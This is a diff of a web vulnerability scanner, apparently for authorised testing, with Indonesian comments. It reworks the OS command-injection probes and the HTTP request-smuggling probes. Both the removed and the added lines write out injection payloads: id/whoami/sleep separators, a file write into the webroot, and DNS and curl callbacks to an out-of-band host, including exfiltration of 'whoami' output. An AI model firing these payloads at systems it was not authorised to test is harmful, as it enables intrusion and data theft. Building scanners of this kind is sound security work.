@@ -3160,166 +3160,283 @@ class SatriaBaruScanner:
 
 
 
-    # ======================== OS Command Injection (113-117, konservatif, bukti terverifikasi) ========================
+    # ======================== OS Command Injection (113-117, bukti berulang & anti-FP) ========================
 
     def _os_cmdi_candidates(self, pages: list[Page], points: list[Point]) -> list[tuple[Point, str]]:
-        keywords = ("cmd", "command", "exec", "execute", "ping", "ip", "host", "domain", "dns", "file", "path",
-                    "dir", "name", "email", "to", "subject", "query", "search", "user", "username", "url", "arg",
-                    "store", "stock", "product", "feedback", "message", "data")
-        cand = []
-        seen = set()
-        for p in points:
+        """Ambil hanya input yang masuk akal untuk fungsi pemanggil proses/sistem.
+
+        Berbeda dari versi lama, tidak ada fallback ke semua parameter umum. Form
+        POST juga dibangun langsung dari FormSpec karena _build_points memang
+        memprioritaskan query/GET dan dapat melewatkan form POST.
+        """
+        high_names = {
+            "cmd", "command", "exec", "execute", "ping", "ip", "host",
+            "hostname", "domain", "dns", "nslookup", "traceroute",
+            "target", "address", "lookup", "utility", "tool",
+        }
+        medium_names = {"url", "email", "to", "file", "path", "query", "search"}
+        path_hints = ("command", "cmd", "ping", "dns", "lookup", "traceroute", "email", "feedback")
+        candidates: dict[tuple[str, str, str], tuple[Point, str, int]] = {}
+
+        def add(point: Point) -> None:
             try:
-                nm = (getattr(p, "name", "") or "").lower()
-                url = getattr(p, "url", "") or ""
-                key = (url, nm, getattr(p, "kind", ""))
-                if key in seen: continue
+                name = str(point.name or "").strip()
+                lower = name.lower()
+                if not name or point.kind not in {"query", "form"}:
+                    return
+                if not self._same_origin(point.url):
+                    return
+                path = (urlparse(point.url).path or "/").lower()
+                if DESTRUCTIVE_PATH_RE.search(path):
+                    return
+                if point.method not in {"GET", "POST"}:
+                    return
                 score = 0
-                for kw in keywords:
-                    if kw in nm: score += 2
-                if any(k in url.lower() for k in ("feedback", "stock", "product", "store", "mail", "email", "ping", "lookup", "dns")):
-                    score += 1
-                if score > 0:
-                    seen.add(key); cand.append((p, nm))
+                if lower in high_names:
+                    score += 10
+                elif any(k in lower for k in high_names if len(k) >= 4):
+                    score += 7
+                elif lower in medium_names and any(h in path for h in path_hints):
+                    score += 4
+                elif any(h in path for h in path_hints) and lower in {"name", "value", "input", "data"}:
+                    score += 3
+                if any(h in path for h in path_hints):
+                    score += 2
+                if score < 4:
+                    return
+                key = (canonical_url(point.url), lower, point.method)
+                old = candidates.get(key)
+                if old is None or score > old[2]:
+                    candidates[key] = (point, lower, score)
             except Exception:
-                continue
-        if not cand:
-            for p in points[:12]:
+                return
+
+        for point in points or []:
+            add(point)
+
+        # Form POST yang tidak muncul sebagai Point tetap harus diuji.
+        for page in pages or []:
+            for form in getattr(page, "forms", []) or []:
                 try:
-                    nm = (getattr(p, "name", "") or "").lower()
-                    key = (getattr(p, "url", ""), nm)
-                    if key in seen: continue
-                    seen.add(key); cand.append((p, nm))
+                    action = urljoin(page.url, form.action or page.url)
+                    if not self._same_origin(action):
+                        continue
+                    if DESTRUCTIVE_PATH_RE.search(urlparse(action).path or "/"):
+                        continue
+                    method = str(form.method or "GET").upper()
+                    if method not in {"GET", "POST"} or form.has_password:
+                        continue
+                    for name, value, typ in form.fields:
+                        if str(typ).lower() in {"password", "hidden", "file", "submit", "button", "checkbox", "radio"}:
+                            continue
+                        point = Point(
+                            key=f"cmdi-form|{urlparse(action).path}|{name}",
+                            kind="form", label=f"form {method} `{name}`",
+                            url=action, name=str(name), original=str(value or "1"),
+                            page_url=page.url, method=method, fields=tuple(form.fields),
+                            interest=8,
+                        )
+                        add(point)
                 except Exception:
                     continue
-        cand.sort(key=lambda x: (0 if any(k in x[1] for k in ("cmd","command","exec","ping","ip","host","email","store","stock")) else 1))
-        return cand[:20]
+
+        ordered = sorted(candidates.values(), key=lambda item: (-item[2], item[0].url, item[1]))
+        return [(point, name) for point, name, _score in ordered[:8]]
+
+    @staticmethod
+    def _os_cmdi_printf_format(token: str) -> str:
+        """Bentuk format octal agar canary tidak muncul literal di request."""
+        return "".join(f"\\{byte:03o}" for byte in token.encode("ascii"))
+
+    def _os_cmdi_oob_url(self, nonce: str) -> str | None:
+        setup = getattr(self, "oob", None)
+        if not setup:
+            return None
+        if getattr(setup, "kind", "") == "webhook_site":
+            token = str(getattr(setup, "token", "") or "").strip()
+            return f"https://webhook.site/{token}/{nonce}" if token else None
+        domain = str(getattr(setup, "domain", "") or "").strip().strip(".").lower()
+        if not re.fullmatch(r"[a-z0-9.-]+", domain) or "." not in domain:
+            return None
+        return f"http://{nonce}.{domain}/"
+
+    @staticmethod
+    def _os_cmdi_oob_seen(result: Any, nonce: str) -> bool:
+        if not result:
+            return False
+        interactions = getattr(result, "interactions", None) or []
+        if isinstance(interactions, str):
+            interactions = [interactions]
+        stack = list(interactions)
+        while stack:
+            item = stack.pop()
+            if isinstance(item, (list, tuple, set)):
+                stack.extend(item)
+            elif nonce.lower() in str(item).lower():
+                return True
+        return False
 
     def _os_cmdi_mark(self, num: int, point: Point, ev: str, method_name: str):
         self._mark(num, point, ev, method_name)
 
     def phase_os_command_injection(self, pages: list[Page], points: list[Point]) -> None:
-        """Deteksi konservatif OS command injection (113-117). Bukti terverifikasi kuat saja; anti-FP."""
+        """Probe command injection dengan canary non-destruktif dan validasi berulang.
+
+        Tidak membuat file pada webroot, tidak membaca akun/file server, dan tidak
+        mengirim data server keluar. Lab yang memerlukan output-redirection atau
+        exfiltrasi data dibiarkan not_confirmed karena pembuktiannya membutuhkan
+        side effect atau pengiriman data sensitif.
+        """
         if not self._within_budget():
             return
         candidates = self._os_cmdi_candidates(pages, points)
         if not candidates:
             return
-        out_patterns = [
-            re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)", re.I),
-            re.compile(r"\broot:x:0:0:", re.I),
-            re.compile(r"Linux\s+\S+\s+\d+\.\d+", re.I),
-            re.compile(r"\bwww-data\b|\bapache\b|\bnginx\b", re.I),
-        ]
-        # 113 simple case
-        if 113 not in self._confirmed:
-            simple_payloads = ["|id",";id","||id","&&id","&id","`id`","$(id)","|whoami",";whoami","||whoami","&&whoami","|uname -a",";uname -a"]
-            for point, _nm in candidates:
-                if 113 in self._confirmed or not self._within_budget(): break
-                try:
-                    base = self.send(point, getattr(point, "original", "test") or "test")
-                    base_text = getattr(base, "text", "") or ""
-                except Exception:
-                    base_text = ""
-                for pl in simple_payloads:
-                    if 113 in self._confirmed or not self._within_budget(): break
-                    try:
-                        resp = self.send(point, pl)
-                    except Exception:
-                        continue
-                    rtext = getattr(resp, "text", "") or ""
-                    if not rtext or rtext == base_text: continue
-                    for pat in out_patterns:
-                        m = pat.search(rtext)
-                        if m and not pat.search(base_text):
-                            ev = f"Output OS command terverifikasi pada '{getattr(point,'name','')}' ({getattr(point,'url','')}) payload {pl!r}: {m.group(0)[:120]!r} (tidak ada pada baseline)."
-                            self._os_cmdi_mark(113, point, ev, "os_cmdi_simple")
-                            break
 
-        # 114 blind time delays
-        if 114 not in self._confirmed and self._within_budget():
-            delay_payloads = [("|sleep 5",4.0),(";sleep 5",4.0),("||sleep 5",4.0),("&&sleep 5",4.0),("& sleep 5 &",4.0),("`sleep 5`",4.0),("$(sleep 5)",4.0),("|ping -c 5 127.0.0.1",3.5),(";ping -c 5 127.0.0.1",3.5)]
-            for point, _nm in candidates:
-                if 114 in self._confirmed or not self._within_budget(): break
-                base_times = []
-                for _ in range(2):
-                    try:
-                        b = self.send(point, getattr(point,"original","test") or "test")
-                        base_times.append(float(getattr(b,"elapsed",0.0) or 0.0))
-                    except Exception: pass
-                base_avg = (sum(base_times)/len(base_times)) if base_times else 0.5
-                for pl, threshold in delay_payloads:
-                    if 114 in self._confirmed or not self._within_budget(): break
-                    try:
-                        t1 = float(getattr(self.send(point, pl), "elapsed", 0.0) or 0.0)
-                        t2 = float(getattr(self.send(point, pl), "elapsed", 0.0) or 0.0)
-                    except Exception:
-                        continue
-                    if t1 >= threshold and t2 >= threshold and t1 >= base_avg + 3.0 and t2 >= base_avg + 3.0:
-                        ev = f"Blind OS cmdi (time delay) terverifikasi pada '{getattr(point,'name','')}' payload {pl!r}: {t1:.2f}s & {t2:.2f}s (baseline ~{base_avg:.2f}s)."
-                        self._os_cmdi_mark(114, point, ev, "os_cmdi_blind_time")
+        # 113: output command injection. Canary hadir dalam output, tetapi tidak
+        # hadir secara literal dalam payload sehingga refleksi input bukan bukti.
+        if 113 not in self._confirmed:
+            for point, _name in candidates:
+                if 113 in self._confirmed or not self._within_budget():
+                    break
+                base_value = str(point.original or "")
+                if not base_value.strip():
+                    base_value = "127.0.0.1" if point.name.lower() in {"ip", "host", "hostname"} else "satria"
+                try:
+                    baseline = [self.send(point, base_value), self.send(point, base_value)]
+                except Exception:
+                    continue
+                if any(r.error or r.status is None or r.status >= 500 for r in baseline):
+                    continue
+                baseline_texts = [(r.text or "") for r in baseline]
+                if max(len(x) for x in baseline_texts) > 250_000:
+                    continue
+                token = "SATRIACMDI" + uuid.uuid4().hex[:12].upper()
+                fmt = self._os_cmdi_printf_format(token)
+                # POSIX shell separators; printf is a shell builtin and only emits
+                # the random canary. The submitted request never contains token.
+                for separator in (";", "|", "&&"):
+                    if 113 in self._confirmed or not self._within_budget():
+                        break
+                    payload = f"{base_value}{separator}printf '{fmt}'"
+                    hits = 0
+                    evidence_resp = None
+                    for _ in range(2):
+                        if not self._within_budget():
+                            break
+                        try:
+                            resp = self.send(point, payload)
+                        except Exception:
+                            continue
+                        body = resp.text or ""
+                        if (not resp.error and resp.status is not None and resp.status < 500
+                                and token not in payload and token in body
+                                and all(token not in base for base in baseline_texts)):
+                            hits += 1
+                            evidence_resp = resp
+                    if hits == 2 and evidence_resp is not None:
+                        ev = (
+                            f"Canary printf unik muncul pada dua respons terpisah untuk parameter "
+                            f"'{point.name}' di {point.url}; token tidak dikirim literal dan tidak ada "
+                            f"pada baseline. Separator={separator!r}, HTTP={evidence_resp.status}."
+                        )
+                        self._os_cmdi_mark(113, point, ev, "os_cmdi_repeated_output_canary")
                         break
 
-        # 115 blind output redirection
-        if 115 not in self._confirmed and self._within_budget():
-            import uuid as _uuid
-            marker = f"satria-cmdi-{_uuid.uuid4().hex[:10]}"
-            rel_files = [f"/{marker}.txt", f"/images/{marker}.txt", f"/static/{marker}.txt"]
-            abs_targets = [f"/var/www/images/{marker}.txt", f"/var/www/html/{marker}.txt", f"/var/www/static/{marker}.txt"]
-            for point, _nm in candidates:
-                if 115 in self._confirmed or not self._within_budget(): break
-                base_url = getattr(point, "url", self.target_url) or self.target_url
-                pu = urlparse(base_url); origin = f"{pu.scheme}://{pu.netloc}"
-                for abs_t, rel_t in zip(abs_targets, rel_files):
-                    if 115 in self._confirmed or not self._within_budget(): break
-                    for sep in (";","|","&&","||"):
-                        if 115 in self._confirmed or not self._within_budget(): break
-                        pl = f"{sep}echo {marker} > {abs_t}"
-                        try: self.send(point, pl)
-                        except Exception: continue
-                        fetch_url = urljoin(origin + "/", rel_t.lstrip("/"))
-                        try: r = self._request("GET", fetch_url, allow_redirects=True)
-                        except Exception: continue
-                        if (getattr(r,"status",0) or 0) == 200 and marker in (getattr(r,"text","") or ""):
-                            try: btxt = getattr(self._request("GET", base_url, allow_redirects=True), "text", "") or ""
-                            except Exception: btxt = ""
-                            if marker not in btxt:
-                                self._os_cmdi_mark(115, point, f"Blind OS cmdi (output redirection) terverifikasi payload {pl!r}: marker {marker!r} terambil dari {fetch_url} (HTTP 200).", "os_cmdi_blind_output_redirection")
-                                break
+        # 114: blind time-based. Dua pasangan no-op/sleep harus konsisten; baseline
+        # lambat atau jitter tinggi membatalkan kesimpulan.
+        if 114 not in self._confirmed and self._within_budget():
+            for point, _name in candidates[:5]:
+                if 114 in self._confirmed or not self._within_budget():
+                    break
+                base_value = str(point.original or "")
+                if not base_value.strip():
+                    base_value = "127.0.0.1" if point.name.lower() in {"ip", "host", "hostname"} else "satria"
+                controls: list[float] = []
+                delays: list[float] = []
+                valid = True
+                for _ in range(2):
+                    if not self._within_budget():
+                        valid = False
+                        break
+                    try:
+                        control = self.send(point, f"{base_value};:")
+                        delayed = self.send(point, f"{base_value};sleep 3")
+                    except Exception:
+                        valid = False
+                        break
+                    if (control.error or delayed.error or control.status is None or delayed.status is None
+                            or control.status >= 500 or delayed.status >= 500):
+                        valid = False
+                        break
+                    if control.status != delayed.status:
+                        valid = False
+                        break
+                    controls.append(float(control.elapsed or 0.0))
+                    delays.append(float(delayed.elapsed or 0.0))
+                if not valid or len(controls) != 2 or len(delays) != 2:
+                    continue
+                control_med = statistics.median(controls)
+                delay_med = statistics.median(delays)
+                paired_gaps = [d - c for d, c in zip(delays, controls)]
+                if (max(controls) - min(controls) <= 1.0
+                        and control_med <= 2.0
+                        and min(paired_gaps) >= 2.4
+                        and delay_med >= control_med + 2.6):
+                    ev = (
+                        f"Delay perintah terulang pada '{point.name}' di {point.url}: "
+                        f"kontrol {controls[0]:.2f}s/{controls[1]:.2f}s, sleep {delays[0]:.2f}s/"
+                        f"{delays[1]:.2f}s; selisih tiap pasangan >=2.4s."
+                    )
+                    self._os_cmdi_mark(114, point, ev, "os_cmdi_paired_time_delay")
+                    break
 
-        # 116 & 117 blind OOB interaction & exfiltration
-        if self.oob and (116 not in self._confirmed or 117 not in self._confirmed) and self._within_budget():
-            oob_domain = getattr(self.oob, "domain", "") or ""
-            oob_token = getattr(self.oob, "token", "") or ""
-            if oob_domain:
-                import uuid as _uuid
-                tag = _uuid.uuid4().hex[:8]
-                host_i = f"{tag}.{oob_domain}".strip(".")
-                host_e = f"{tag}e.{oob_domain}".strip(".")
-                interact_payloads = [f"|nslookup {host_i}", f";nslookup {host_i}", f"&nslookup {host_i}&", f"|curl http://{host_i}/", f";curl http://{host_i}/", f"&curl http://{host_i}/ &"]
-                exfil_payloads = [f"|nslookup $(whoami).{host_e}", f";nslookup $(whoami).{host_e}", f"&nslookup $(whoami).{host_e}&", f"||nslookup `whoami`.{host_e}"]
-                targets = candidates if candidates else [(self._dummy_point(), "")]
-                for point, _nm in targets:
-                    if (116 in self._confirmed and 117 in self._confirmed) or not self._within_budget(): break
-                    if 116 not in self._confirmed:
-                        for pl in interact_payloads:
-                            if 116 in self._confirmed or not self._within_budget(): break
-                            try: self.send(point, pl)
-                            except Exception: pass
-                        try: got = self._poll_oob()
-                        except Exception: got = None
-                        if got and getattr(got, "interactions", None):
-                            self._os_cmdi_mark(116, point, f"Blind OS cmdi (OOB interaction) terverifikasi: interaksi ke {host_i} tercatat (token {oob_token}).", "os_cmdi_blind_oob_interaction")
-                    if 117 not in self._confirmed:
-                        for pl in exfil_payloads:
-                            if 117 in self._confirmed or not self._within_budget(): break
-                            try: self.send(point, pl)
-                            except Exception: pass
-                        try: got = self._poll_oob()
-                        except Exception: got = None
-                        vals = getattr(got, "values", None) if got else None
-                        if vals:
-                            self._os_cmdi_mark(117, point, f"Blind OS cmdi (OOB data exfiltration) terverifikasi: data exfiltrated {vals} (token {oob_token}).", "os_cmdi_blind_oob_exfiltration")
+        # 116: hanya DNS/HTTP callback unik ke domain OOB operator. Poller harus
+        # tersedia; interaksi dari token/domain lama tidak boleh dianggap bukti.
+        if (self.oob and getattr(self.oob, "poll_url", None)
+                and 116 not in self._confirmed and self._within_budget()):
+            for point, _name in candidates[:5]:
+                if 116 in self._confirmed or not self._within_budget():
+                    break
+                base_value = str(point.original or "")
+                if not base_value.strip():
+                    base_value = "127.0.0.1" if point.name.lower() in {"ip", "host", "hostname"} else "satria"
+                nonce = "cmdi" + uuid.uuid4().hex[:12]
+                callback = self._os_cmdi_oob_url(nonce)
+                if not callback:
+                    break
+                host = urlparse(callback).hostname or ""
+                if not host:
+                    continue
+                if getattr(self.oob, "kind", "") == "webhook_site":
+                    payloads = (f"{base_value};curl --max-time 3 {callback}",)
+                else:
+                    payloads = (f"{base_value};nslookup {host}", f"{base_value};ping -c 1 -W 1 {host}")
+                sent = 0
+                for payload in payloads:
+                    if not self._within_budget():
+                        break
+                    try:
+                        self.send(point, payload)
+                        sent += 1
+                    except Exception:
+                        continue
+                if not sent:
+                    continue
+                try:
+                    result = self._poll_oob()
+                except Exception:
+                    result = None
+                if self._os_cmdi_oob_seen(result, nonce):
+                    ev = (
+                        f"Command injection blind memicu callback OOB unik {nonce} ke host "
+                        f"{host}; interaksi cocok persis dengan nonce pemindaian ini."
+                    )
+                    self._os_cmdi_mark(116, point, ev, "os_cmdi_oob_unique_callback")
+                    break
+
+        # 115 (output redirection) dan 117 (data exfiltration) sengaja tidak
+        # dipancing: keduanya memerlukan penulisan file atau transfer data target.
 
 
     # ======================== Web Cache Poisoning (118-130, bukti cache terverifikasi) ========================
@@ -7275,10 +7392,10 @@ class SatriaBaruScanner:
                         self._auth_mark(227, action, f"Endpoint 2FA tanpa penguncian/rate-limit jelas setelah percobaan berulang terindikasi di {action}.", "auth_2fa_bruteforce")
 
 
-    # ======================== HTTP Request Smuggling (91-112) ========================
-    # Deteksi berbasis framing HTTP/1.1 mentah: dua request dikirim pada SATU koneksi
-    # (pipelining) sehingga desync teramati langsung, bukan sekadar dugaan dari
-    # perubahan status. Konfirmasi wajib diulang dan dibandingkan dengan baseline.
+    # ======================== HTTP Request Smuggling (91-112, differential strict) ========================
+    # Probe dibatasi pada desinkronisasi HTTP/1.1 yang dapat dibuktikan dalam satu
+    # koneksi. Tidak melakukan cache poisoning, XSS delivery, auth bypass, response
+    # queue poisoning, atau menangkap request pengguna lain.
 
     def _smug_target(self) -> tuple[str, int, str, str]:
         pu = urlparse(self.target_url)
@@ -7290,62 +7407,70 @@ class SatriaBaruScanner:
             path += "?" + pu.query
         return scheme, port, host, path
 
+    def _smug_host_header(self) -> str:
+        scheme, port, host, _ = self._smug_target()
+        default_port = 443 if scheme == "https" else 80
+        return f"{host}:{port}" if port != default_port else host
+
     def _smug_connect(self, timeout: float | None = None):
-        import socket, ssl as _ssl
+        import socket as _socket
+        import ssl as _ssl
         scheme, port, host, _ = self._smug_target()
         if not host:
             return None
-        t = timeout if timeout is not None else max(3.0, float(getattr(self, "timeout", 8.0) or 8.0))
+        t = timeout if timeout is not None else max(3.0, min(8.0, float(getattr(self, "timeout", 8.0) or 8.0)))
         try:
-            s = socket.create_connection((host, port), timeout=t)
+            conn = _socket.create_connection((host, port), timeout=t)
+            conn.settimeout(t)
+            if scheme == "https":
+                # Verifikasi sertifikat tetap aktif; jangan menyamarkan TLS yang
+                # gagal sebagai hasil HTTP yang valid.
+                context = _ssl.create_default_context()
+                conn = context.wrap_socket(conn, server_hostname=host)
+                conn.settimeout(t)
+            return conn
         except Exception:
-            return None
-        try:
-            s.settimeout(t)
-        except Exception:
-            pass
-        if scheme == "https":
             try:
-                ctx = _ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = _ssl.CERT_NONE
-                s = ctx.wrap_socket(s, server_hostname=host)
+                conn.close()
             except Exception:
-                try:
-                    s.close()
-                except Exception:
-                    pass
-                return None
-        return s
+                pass
+            return None
 
     @staticmethod
     def _smug_dechunk(data: bytes) -> tuple[bytes | None, int]:
-        """Dekode satu body chunked. Kembalikan (body, byte_terpakai) atau (None, 0)."""
+        """Parse chunked body lengkap; body terpotong tidak pernah dianggap valid."""
         out = bytearray()
         pos = 0
         while True:
             nl = data.find(b"\r\n", pos)
             if nl < 0:
                 return None, 0
+            size_line = data[pos:nl].split(b";", 1)[0].strip()
             try:
-                size = int(data[pos:nl].split(b";")[0].strip() or b"0", 16)
-            except ValueError:
+                if not size_line or not re.fullmatch(rb"[0-9A-Fa-f]+", size_line):
+                    return None, 0
+                size = int(size_line, 16)
+            except Exception:
                 return None, 0
             pos = nl + 2
             if size == 0:
-                end = data.find(b"\r\n", pos)
-                if end < 0:
-                    return None, 0
-                return bytes(out), end + 2
-            if len(data) < pos + size + 2:
+                # Trailer section ends at an empty CRLF line.
+                trailer_end = data.find(b"\r\n\r\n", pos)
+                if trailer_end >= 0:
+                    return bytes(out), trailer_end + 4
+                if data[pos:pos + 2] == b"\r\n":
+                    return bytes(out), pos + 2
                 return None, 0
-            out += data[pos:pos + size]
-            pos += size + 2
+            end = pos + size
+            if len(data) < end + 2 or data[end:end + 2] != b"\r\n":
+                return None, 0
+            out.extend(data[pos:end])
+            pos = end + 2
 
     def _smug_parse_responses(self, raw: bytes) -> list[dict[str, Any]]:
-        """Parse satu atau lebih respons HTTP/1.1 berurutan (Content-Length/chunked)."""
-        out: list[dict[str, Any]] = []
+        """Parser respons berurutan dengan pemeriksaan framing yang ketat."""
         data = raw or b""
+        out: list[dict[str, Any]] = []
         while data:
             idx = data.find(b"\r\n\r\n")
             if idx < 0:
@@ -7354,413 +7479,300 @@ class SatriaBaruScanner:
             lines = head.split(b"\r\n")
             if not lines:
                 break
-            m = re.match(br"HTTP/\d(?:\.\d)?\s+(\d{3})", lines[0])
-            if not m:
-                # sisa request yang tidak valid (mis. "GGET ...") -> bukan respons.
+            match = re.match(br"HTTP/(\d(?:\.\d)?)\s+(\d{3})(?:\s+(.*))?$", lines[0])
+            if not match:
                 break
-            status = int(m.group(1))
+            status = int(match.group(2))
+            reason = (match.group(3) or b"").decode("latin-1", "ignore")
             headers: dict[str, str] = {}
+            duplicate_headers: dict[str, list[str]] = {}
             for line in lines[1:]:
-                if b":" in line:
-                    k, v = line.split(b":", 1)
-                    headers[k.decode("latin-1", "ignore").strip().lower()] = v.decode("latin-1", "ignore").strip()
-            body = b""
-            if "chunked" in headers.get("transfer-encoding", "").lower():
-                body, used = self._smug_dechunk(rest)
-                if body is None:
+                if b":" not in line:
+                    continue
+                key, value = line.split(b":", 1)
+                name = key.decode("latin-1", "ignore").strip().lower()
+                val = value.decode("latin-1", "ignore").strip()
+                duplicate_headers.setdefault(name, []).append(val)
+                headers[name] = val
+            no_body = (100 <= status < 200) or status in {204, 304}
+            if no_body:
+                body = b""
+                data = rest
+            elif "chunked" in headers.get("transfer-encoding", "").lower():
+                decoded, used = self._smug_dechunk(rest)
+                if decoded is None:
                     break
+                body = decoded
                 data = rest[used:]
             elif headers.get("content-length", "").strip().isdigit():
-                n = int(headers["content-length"].strip())
-                body = rest[:n]
-                data = rest[n:]
+                length = int(headers["content-length"].strip())
+                if len(rest) < length:
+                    break
+                body = rest[:length]
+                data = rest[length:]
             else:
+                # Tanpa framing eksplisit, body hanya dapat dipastikan selesai
+                # setelah server menutup koneksi; jangan parse respons berikutnya.
                 body = rest
                 data = b""
-            out.append({"status": status, "headers": headers,
-                        "body": body.decode("latin-1", "ignore")})
+            out.append({
+                "status": status,
+                "reason": reason,
+                "headers": headers,
+                "duplicate_headers": duplicate_headers,
+                "body": body.decode("latin-1", "ignore"),
+            })
+            if no_body and status == 101:
+                break
         return out
 
     def _smug_exchange(self, requests_list: list[bytes], expect: int = 2,
                        timeout: float | None = None, pause: float = 0.0) -> tuple[list[dict[str, Any]], float, str | None]:
-        """Kirim beberapa request mentah pada satu koneksi, baca hingga `expect` respons."""
-        import socket, time as _time
-        t = timeout if timeout is not None else max(4.0, min(12.0, float(getattr(self, "timeout", 8.0) or 8.0)))
-        s = self._smug_connect(timeout=t)
-        if s is None:
+        """Kirim request mentah pada satu TCP/TLS connection dan ambil respons lengkap."""
+        import socket as _socket
+        import time as _time
+        if (not requests_list or not self._within_budget()
+                or self.request_count + len(requests_list) > self.max_requests):
+            return [], 0.0, "budget_exhausted"
+        # Hitung request mentah ke dalam budget pemindaian global.
+        self.request_count += len(requests_list)
+        self.stats["requests"] = self.request_count
+        t = timeout if timeout is not None else max(3.0, min(8.0, float(getattr(self, "timeout", 8.0) or 8.0)))
+        conn = self._smug_connect(timeout=t)
+        if conn is None:
             return [], 0.0, "connect_failed"
-        start = _time.time()
-        buf = b""
-        responses: list[dict[str, Any]] = []
+        started = _time.monotonic()
+        buf = bytearray()
         err: str | None = None
         try:
-            for i, raw in enumerate(requests_list):
-                s.sendall(raw)
-                if pause and i == 0:
-                    _time.sleep(pause)
+            for index, raw in enumerate(requests_list):
+                conn.sendall(raw)
+                if pause and index == 0:
+                    _time.sleep(min(float(pause), 1.0))
             try:
-                s.shutdown(socket.SHUT_WR)
+                conn.shutdown(_socket.SHUT_WR)
             except Exception:
                 pass
-            deadline = start + t
-            while _time.time() < deadline:
+            deadline = _time.monotonic() + t
+            while _time.monotonic() < deadline:
                 try:
-                    s.settimeout(max(0.5, min(3.0, deadline - _time.time())))
-                    chunk = s.recv(8192)
-                except socket.timeout:
+                    conn.settimeout(max(0.25, min(1.5, deadline - _time.monotonic())))
+                    chunk = conn.recv(8192)
+                except _socket.timeout:
                     break
-                except Exception:
+                except Exception as exc:
+                    err = f"{type(exc).__name__}: {str(exc)[:100]}"
                     break
                 if not chunk:
                     break
-                buf += chunk
-                responses = self._smug_parse_responses(buf)
-                if len(responses) >= expect:
+                buf.extend(chunk)
+                parsed = self._smug_parse_responses(bytes(buf))
+                if len(parsed) >= max(1, int(expect)):
                     break
         except Exception as exc:
             err = f"{type(exc).__name__}: {str(exc)[:100]}"
         finally:
             try:
-                s.close()
+                conn.close()
             except Exception:
                 pass
-        if not responses:
-            responses = self._smug_parse_responses(buf)
-        return responses, _time.time() - start, err
+        return self._smug_parse_responses(bytes(buf)), _time.monotonic() - started, err
 
     def _smug_build(self, start_line: str, headers: list[tuple[str, str]], body: bytes = b"") -> bytes:
-        _, _, host, _ = self._smug_target()
-        lines = [start_line]
-        if not any(k.lower() == "host" for k, _ in headers):
-            lines.append(f"Host: {host}")
-        lines.extend(f"{k}: {v}" for k, v in headers)
-        lines.extend(["", ""])
-        return ("\r\n".join(lines)).encode("latin-1", "ignore") + (body or b"")
+        """Bangun request dengan validasi CR/LF agar header tak terinjeksi tak sengaja."""
+        if "\r" in start_line or "\n" in start_line or not start_line.endswith("HTTP/1.1"):
+            raise ValueError("Invalid HTTP/1.1 request line")
+        normalized = []
+        for key, value in headers:
+            key, value = str(key), str(value)
+            if not key or any(ch in key for ch in "\r\n:") or "\r" in value or "\n" in value:
+                raise ValueError("Invalid raw HTTP header")
+            normalized.append((key, value))
+        if not any(k.lower() == "host" for k, _ in normalized):
+            normalized.insert(0, ("Host", self._smug_host_header()))
+        lines = [start_line] + [f"{k}: {v}" for k, v in normalized] + ["", ""]
+        return "\r\n".join(lines).encode("latin-1", "strict") + (body or b"")
 
     def _smug_get(self, path: str | None = None, close: bool = True) -> bytes:
-        _, _, host, dpath = self._smug_target()
-        p = path or dpath or "/"
-        headers = [("Host", host), ("Connection", "close" if close else "keep-alive")]
-        return self._smug_build(f"GET {p} HTTP/1.1", headers)
+        _, _, _, default_path = self._smug_target()
+        request_path = path or default_path or "/"
+        headers = [("Host", self._smug_host_header()), ("Connection", "close" if close else "keep-alive")]
+        return self._smug_build(f"GET {request_path} HTTP/1.1", headers)
 
-    def _smug_te_frontend(self) -> bool:
-        """True bila ada lapisan yang benar-benar mem-parse Transfer-Encoding: chunked.
-
-        Bukti: chunk size tidak valid harus ditolak (400) oleh parser TE. Server yang
-        hanya memakai Content-Length akan mengabaikannya (200), sehingga probe TE.CL
-        tidak diklaim sebagai desync pada server semacam itu (anti false positive).
-        """
-        _, _, host, _ = self._smug_target()
-        raw = self._smug_build(
-            "POST / HTTP/1.1",
-            [("Host", host), ("Transfer-Encoding", "chunked"), ("Connection", "close")],
-            b"zz\r\nabc\r\n0\r\n\r\n")
-        res, _, _ = self._smug_exchange([raw], 1)
-        return bool(res) and res[0].get("status") == 400
-
-    def _smug_normal_status(self, path: str | None = None) -> tuple[int | None, str, float, str | None]:
-        res, elapsed, err = self._smug_exchange([self._smug_get(path, close=True)], 1)
-        if not res:
-            return None, "", elapsed, err
-        return res[0]["status"], res[0].get("body", ""), elapsed, err
-
-    def _smug_desync_once(self, smuggle: bytes, follow_path: str = "/") -> tuple[bool, str]:
-        """Kirim [smuggle, follow-up] pada satu koneksi; desync = respons kedua malformed."""
-        b_status, _, _, _ = self._smug_normal_status(follow_path)
-        if b_status is None:
-            return False, ""
-        res, elapsed, err = self._smug_exchange([smuggle, self._smug_get(follow_path, close=True)], 2)
-        if not res or len(res) < 2:
-            return False, ""
-        second = res[1]
-        low = (second.get("body") or "")[:400].lower()
-        bad = second["status"] in (400, 404, 405, 501)
-        signal = second["status"] in (400, 405, 501) or any(tok in low for tok in (
-            "unrecognized method", "invalid method", "gpost", "bad request", "invalid request"))
-        if bad and signal and b_status not in (400, 404, 405, 501):
-            return True, (f"pipeline: baseline GET {follow_path} -> {b_status}, respons kedua setelah "
-                          f"smuggle+follow -> {second['status']} "
-                          f"({(second.get('body') or '')[:100]!r}), {elapsed:.2f}s"
-                          + (f", err={err}" if err else ""))
-        return False, ""
-
-    def _smug_desync(self, smuggle: bytes, follow_path: str = "/", trials: int = 2) -> tuple[bool, str]:
-        evidences: list[str] = []
-        for _ in range(max(1, trials)):
-            ok, ev = self._smug_desync_once(smuggle, follow_path)
-            if not ok:
-                return False, ""
-            evidences.append(ev)
-        return True, evidences[-1]
+    def _smug_control_pipeline(self, token: str) -> tuple[bool, list[dict[str, Any]]]:
+        """Valida que target supporta parsing di due GET normali sulla stessa connessione."""
+        path_a = f"/?satria_control={token}a"
+        path_b = f"/?satria_control={token}b"
+        responses, _, _ = self._smug_exchange(
+            [self._smug_get(path_a, close=False), self._smug_get(path_b, close=True)],
+            expect=2,
+        )
+        if len(responses) < 2:
+            return False, responses
+        clean = all(200 <= int(item.get("status", 0)) < 500 for item in responses[:2])
+        clean = clean and all(int(item.get("status", 0)) not in {400, 408, 413, 417, 421, 429} for item in responses[:2])
+        return clean, responses
 
     @staticmethod
-    def _smug_admin_text(text: str) -> bool:
-        low = (text or "").lower()
-        if "admin panel" in low or "admin interface" in low or "user management" in low:
-            return True
